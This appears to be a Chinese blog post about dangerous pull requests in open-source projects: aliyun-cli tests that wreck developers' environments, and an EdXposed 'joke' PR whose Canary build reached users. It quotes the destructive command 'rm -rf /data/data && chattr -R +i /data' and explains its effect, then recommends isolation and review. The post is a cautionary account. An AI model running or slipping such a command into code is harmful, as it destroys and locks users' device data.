## 你的环境应该是一次性的吧

[aliyun-cli](https://github.com/aliyun/aliyun-cli) 是阿里云命令行开源工具，方便用户管理阿里云资源。作为大公司的项目，照理说应该不会出现什么草台班子的行为。但是

<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/04.jpg?raw=true" alt="ali" style="width:512px;"/>

也就是说你如果是个负责任的开源贡献者，想在提交代码前做一些单元测试，那么你可能就要和自己的开发环境说再见了😇。

大公司通常会有更完善的测试团队来搭建测试环境，所有的测试会被放在一个相对隔离的容器环境中执行以确保安全，隔离的环境也就意味着可以进行风险更高的测试。但是个人开发者由于资源，时间以及能力有限，未必会做这种环境隔离。这种开发习惯的差异应该就是这个悲剧的源头。

所以还是希望大家在参与开源项目开发时也尽可能做好隔离。

## 我只想开个玩笑……

上面的例子是由于环境隔离导致开发者损失，这个例子会直接导致最终用户痛失数据。[Exposed](https://github.com/ElderDrivers/EdXposed) 是一个在安卓<span style="color:red"><b>高权限</b></span>模式下运行的框架，可以在不修改 APK 的前提下修改程序运行。

项目配置了 Canary release，将新PR的功能打包成一个相对不稳定的版本，方便测试或让一些想尝鲜的用户抢先体验。这本身算是个常见的配置，但是也给下面的事故埋下了伏笔。

最初，有一位开发者发现了一个[漏洞](https://github.com/ElderDrivers/EdXposed/pull/537)， 可以将<span style="color:red"><b>删除用户数据</b></span>的脚本放到项目中，通过 PR 触发 Canary build。还好，这个版本并没有被推送给用户。

<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/05.jpg?raw=true" alt="ghost" style="width:512px;"/>

不幸的是，另一位开发者看到了这个 PR，想和开发者开一个玩笑，于是将这盘“贞子的录像带”又[拷贝](https://github.com/ElderDrivers/EdXposed/pull/540)了一次，这次显然就没那么幸运了，该版本被推送到了部分倒霉的用户手中，摘录一下开发者的原话

>　　我添加的代码是 rm -rf /data/data && chattr -R +i /data。这个代码前半部分和上面同理，意思是删除根目录下的 /data/data 文件夹。后半部分的意思是锁定根目录下的 Data 文件夹，被锁定的文件夹无法被修改(比如删除、重命名、写入内容)。
>
>　　这里有必要再介绍一下 /data/data 下是什么东西。
>
>　　大部分用户对刷机都非常熟悉，刷机中的“双清+格式化 Data”一般被认为等于手机恢复出厂设置，而双清中的一个清理即为清理 Data，即我上面所说的，根目录下的 Data 文件夹。而在 TWRP 中，清理 Data 会默认跳过 /data/media，这也是为什么清理了 Data 分区还要进行一次格式化 Data。/data/data 文件夹作为 Data 分区下的文件夹，存储了某些重要的系统文件，但是除 Termux 等比较特殊的软件，一般来说，没有任何用户重要的数据存储在这个文件夹下。如果你有 root 权限的话，你可以打开这个文件夹看看，/data/data 下大部分文件都是空的。就像你在 TWRP 中清理了 Data 分区后可以正常开机，你手机内置存储的文件不会在清理 Data 后丢失，而我这个指令只是清除 Data 分区下的的一个文件夹，一般来说，不会造成特别重大的损失(比如你手机里的照片和视频都不会丢失)，但是还是会对大部分用户使用造成不可忽视的负面影响。
>
>　　再必须重点提及的是锁定 Data 分区。
>
>　　chattr +i 是 Linux 下锁定某一文件/目录的指令，其原意是为了锁定某一个特别重要的文件防止被进行任何修改。这个指令不会对你的数据造成任何破坏，相反，被锁定的数据不可能被进行任何更改。与之相应的，因为禁止读写，手机也无法正常使用。这个问题可以通过输入 chattr -i 解除锁定。

这位同学事后进行了道歉，也表达愿意尽力承担损失，但是被害者们似乎[不太买帐](https://github.com/ElderDrivers/EdXposed/pull/542)……

{% include note.html content="
这类问题常见于那些需要搭建复杂测试环境的项目，当用户有意或无意将包含恶意代码的内容提交到项目中时，可能会使得整个测试环境报销，所以大家在开发过程中请务必注意：

1. 尽可能做好环境隔离，使用容器来测试项目
2. 对于不熟悉的贡献者，开启手动 approval，在确保安全的情况下再启动检查和自动化测试
3. 务必认真进行 review
